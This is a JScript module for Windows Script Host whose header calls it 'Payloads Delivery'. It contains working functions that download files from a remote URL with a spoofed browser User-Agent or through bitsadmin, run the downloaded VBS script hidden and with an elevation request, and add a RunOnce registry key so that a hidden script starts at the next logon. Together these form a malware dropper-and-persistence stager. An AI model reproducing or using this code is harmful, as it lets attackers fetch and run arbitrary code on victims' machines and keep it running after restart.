/******************************************************************************
*
* MODULE1.JS
* This file contain main modules for Payloads Delivery
*
******************************************************************************/


/******************************************************************************
'
' CreateRunOnceKey( strPath, strBatCmd )
' This Function Creates a strBatCmd Key at the Registry Node
' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
' with Value "wscript.exe //B //Nologo  " & strPath & "\" & strBatCmd
' After overload it is run this command
' The Script No Run at Elevated Mode. Further the Rights can be Elevated.
'
' PARAMETERS:   strPath -- The Path to strBatCmd
'               strBatCmd -- a Script File with instructions
'               (Windows Script Shell)
'
' RETURNS:      0 -- if Success
'               1 -- on Error takes place
'*****************************************************************************/

function CreateRunOnceKey(strPath, strBatCmd){
    var constRunOnce;
    var constRunBat;
    var strValue, strKey, wshShell;
    constRunOnce = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
    constRunBat = "wscript.exe //B //Nologo ";wshShell = new ActiveXObject("WScript.Shell");
    strKey = constRunOnce + "\\" + strBatCmd;
    strValue = constRunBat + "\"" + strPath + "\\" + strBatCmd + "\"";
    wshShell.RegWrite(strKey, strValue, "REG_SZ");
    return 0;
}

/*****************************************************************************
'
' CreatedRunOnceKey( strPath, strBatCmd )
' This Subroutine checks if Function CreateRunOnceKey Run with Success
' and Show result on Screen
'
' PARAMETERS:   strPath -- The Path to strBatCmd
'               strBatCmd -- a Command File with instructions
'               (Windows Command Shell)
'
' RETURNS:      NONE
'
******************************************************************************/
function CreatedRunOnceKey(strPath, strBatCmd){
    var strSuccess;
    var strFail;
    strSuccess = "The key " + strBatCmd + " at RunOnce Registry section was Created\n";
    strFail = "The key " + strBatCmd + " at RunOnce Registry section was NOT Created\n";
    if( !CreateRunOnceKey(strPath, strBatCmd) )
	WScript.Echo( strSuccess );
    else
	WScript.Echo( strFail );
 }

/******************************************************************************
'
' CreateTwocascadeFolders( strDisk, strFolder1, strFolder2 )
'
' This Function Creates on Disk strDisk the Folders strFolder1 and strFolder2
'
' PARAMETERS:   strDisk -- the Disk Drive. Must be Exist!
'               strFolder1 -- the first Folder on strDisk. May be Exist.
'               strFolder2 -- the Second Folder on strDisk. May be Exist.
'
' RETURNS:      true if Success Create or Folder Exist
'               false if Cascade Can't Create
'
******************************************************************************/

function CreateTwocascadeFolders(strDisk, strFolder1, strFolder2){
    var fso;
    var strPath;
    var fsoCreateResult;
    var blnEnableCreated;
    var blnDrv;
    strDisk = strDisk.toUpperCase();
    blnEnableCreated = true;
    fso = new ActiveXObject("Scripting.FileSystemObject");
    blnDrv = fso.DriveExists(fso.GetDriveName(strDisk));
    if( blnEnableCreated & blnDrv)
        blnEnableCreated = true;
    else
        blnEnableCreated = false;
    strPath = strDisk + "\\" + strFolder1
    if( blnEnableCreated & !fso.FolderExists(strPath))
    {
        fsoCreateResult = fso.CreateFolder(strPath);
        if( fsoCreateResult != null )
            blnEnableCreated = true;
        else
            blnEnableCreated = false;
    }
    strPath = strPath + "\\" + strFolder2;
    if( blnEnableCreated & !fso.FolderExists(strPath) )
    {
        fsoCreateResult = fso.CreateFolder(strPath);
        if( fsoCreateResult != null )
            blnEnableCreated = true;
        else
            blnEnableCreated = false;
    }
    return blnEnableCreated;
}

/******************************************************************************
'
' CreatedCascade strDisk, strFolder1, strFolder2
'
' This Subroutine Creates Cascade of Folders and Says Operator about a Result
' of the Function CreateTwocascadeFolders Called
'
' PARAMETERS:   strDisk -- the Disk Drive. Must be Exist!
'               strFolder1 -- the first Folder on strDisk. May be Exist.
'               strFolder2 -- the Second Folder on strDisk. May be Exist.
'
' RETURNS:      NONE
'
******************************************************************************/
function CreatedCascade(strDisk, strFolder1, strFolder2){
    var strSuccess, strFail;
    strSuccess = "The Folders Cascade has created or Exist\n";
    strFail = "Fail to Create Cascade on Error\n";
    if( CreateTwocascadeFolders(strDisk, strFolder1, strFolder2) )
	WScript.Echo( strSuccess );
    else
	WScript.Echo( strFail );
}

/******************************************************************************
'
' UploadFilesFromInt( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'
' RETURNS:      0 -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'               2 -- If HTTP Response Not 200 (while is not make)
'
******************************************************************************/

function UploadFilesFromInt(strFile, strURL, strPath){
    var fso, xmlHttp, adoStream;
    fso = new ActiveXObject("Scripting.FileSystemObject");
    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    adoStream = new ActiveXObject("Adodb.Stream");
    var strFileURL;
    var strLocal_Path;
    var intUploadFilesFromInt;
    var blnExistRemoteFile;
    strFileURL = strURL + strFile;
    strLocal_Path = strPath + "\\" + strFile;
	
    // Check if Path is Exist
    if(fso.FolderExists(strPath))
	intUploadFilesFromInt = 0;
    else
	intUploadFilesFromInt = 1;
	
    // Downloaded File
    xmlHttp.Open( "GET", strFileURL, false );
    xmlHttp.SetRequestHeader( "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36");
    xmlHttp.Send();
    if( xmlHttp.Status == 200 && intUploadFilesFromInt == 0)
        blnExistRemoteFile = true;
    else
    {
        blnExistRemoteFile = false;
        intUploadFilesFromInt = 2;
        xmlHttp.Abort();
    }
    if( blnExistRemoteFile )
    {
	adoStream.Type = 1;
	adoStream.Mode = 3;
	adoStream.Open();
	adoStream.Write(xmlHttp.responseBody);
	adoStream.SaveToFile( strLocal_Path, 2 );
	// /Downloaded File
		
	adoStream.Close();
	xmlHttp.Abort();
		
	// Check If File Downloaded
	if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0 )
		intUploadFilesFromInt = 1;
	// /Check if File Downloaded
    }
    return intUploadFilesFromInt;
}

/******************************************************************************
'
' UploadFilesFromInt01( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses "BitsAdmin.exe" Funktion for Load File
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'				intTimeOut -- estimated Time for Download (ms)
'
' RETURNS:      0 -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'
******************************************************************************/

function UploadFilesFromInt01(strFile, strURL, strPath, intTimeOut)
{
    var fso, wshShell, shApp;
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wshShell = new ActiveXObject("WScript.Shell");
    shApp = new ActiveXObject("Shell.Application");
    var strFileURL;
    var strLocal_Path;
    var intUploadFilesFromInt;
    var blnExistRemoteFile;
    strFileURL = strURL + strFile;
    strLocal_Path = strPath + "\\" + strFile;
	
    // Check if Path is Exist
    if(fso.FolderExists(strPath))
	intUploadFilesFromInt = 0;
    else
	intUploadFilesFromInt = 1;
	
    // Downloaded File
    var envVarProccess;
    var pathCmd, strSysPath, strParam;
    envVarProccess = wshShell.Environment("PROCESS");
    pathCMD = envVarProccess("SystemRoot") + "\\System32\\";
    strSysPath = pathCMD + "bitsadmin.exe";
    strParam = "/Transfer STEA_TRANSFER /DOWNLOAD /Priority FOREGROUND " + strFileURL + " \"" + strLocal_Path + "\""
    shApp.ShellExecute( strSysPath, strParam, pathCMD, "runas", 0 );
    // /Downloaded File
//    setTimeout( DoNothing, intTimeOut );
    WScript.Sleep( intTimeOut );
		
    // Check If File Downloaded
	if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0 )
		intUploadFilesFromInt = 1;
    // /Check if File Downloaded
    return intUploadFilesFromInt;
}

/******************************************************************************
'
' SUBROUTENE UploadedFilesFromInt( strFile, strURL, strPath )
'
' This Subroutine Call UploadFilesFromInt( strFile, strURL, strPath ) and Show
' the Result on Screen
'
' Now the Subroutine is only saying on success or not of the function call
'
******************************************************************************/

function UploadedFilesFromInt(strFile, strURL, strPath){
    var strSuccess, strFail, strURLFail, iResult;
    strSuccess = "The File " + strFile + " was Successfully Downlodaded\nFrom URL: " + strURL + "\nTo Path: " + strPath + "\n";
    strFail = "Error to Create File: " + strFile + " on Path " + strPath + "\n";
    strURLFail = "The URL: " + strURL + strFile + " is not valid!\n";
    iResult = UploadFilesFromInt(strFile, strURL, strPath);
    switch( iResult )
    {
        case 0:
            WScript.Echo( strSuccess );
			break;
        case 1:
            WScript.Echo( strFail );
			break;
        case 2:
            WScript.Echo( strURLFail );
			break;
    }
}

/******************************************************************************
'
' SUBROUTENE UploadedFilesFromInt01( strFile, strURL, strPath )
'
' This Subroutine Call UploadFilesFromInt01( strFile, strURL, strPath intTimeOut ) and Show
' the Result on Screen
'
' Now the Subroutine is only saying on success or not of the function call
'
******************************************************************************/

function UploadedFilesFromInt01(strFile, strURL, strPath, intTimeOut){
    var strSuccess, strFail, strURLFail, iResult;
    strSuccess = "The File " + strFile + " was Successfully Downlodaded\nFrom URL: " + strURL + "\nTo Path: " + strPath + "\n";
    strFail = "Error to Create File: " + strFile + " on Path " + strPath + "\n";
    strURLFail = "The URL: " + strURL + strFile + " is not valid!\n";
    iResult = UploadFilesFromInt01(strFile, strURL, strPath, intTimeOut)
    switch( iResult )
    {
	case 0:
        WScript.Echo( strSuccess );
	    break;
	case 1:
		WScript.Echo( strFail );
		break;
    }
}

function DoNothing(){
	return;
}

/******************************************************************************
'
' RunDownloadedScript( strPath, strVBS )
' This Function Run a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      NONE
'
******************************************************************************/

function RunDownloadedScript(strPath, strVBS, intTimeOut ){
    var constRun_VBS, constOpt;
    constRun_VBS = "//Nologo ";
    constOpt = "";
    var strValue, wshShell, shApp;
    wshShell = new ActiveXObject("WScript.Shell");
    shApp = new ActiveXObject("Shell.Application");
    strValue = constRun_VBS +"\"" + strPath + "\\" + strVBS + "\"" + constOpt;
    shApp.ShellExecute( "C:\WINDOWS\System32\cscript.exe", strValue, strPath, "runas", 0 );
//    setTimeout( DoNothing, intTimeOut );
    WScript.Sleep(intTimeOut);
}

/******************************************************************************
'
' RunedDownloadedScript( strPath, strVBS, intTimeOut )
' This Subroutine checks if Function RunDownloadedScript Run with Success
' and Show result on Screen
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      NONE
'
******************************************************************************/

function RunedDownloadedScript(strPath, strVBS, intTimeOut){
    var strSuccess;
    strSuccess = "The Script " + strVBS + " was Run with Success\n";
    RunDownloadedScript(strPath, strVBS, intTimeOut );
    WScript.Echo( strSuccess );
}

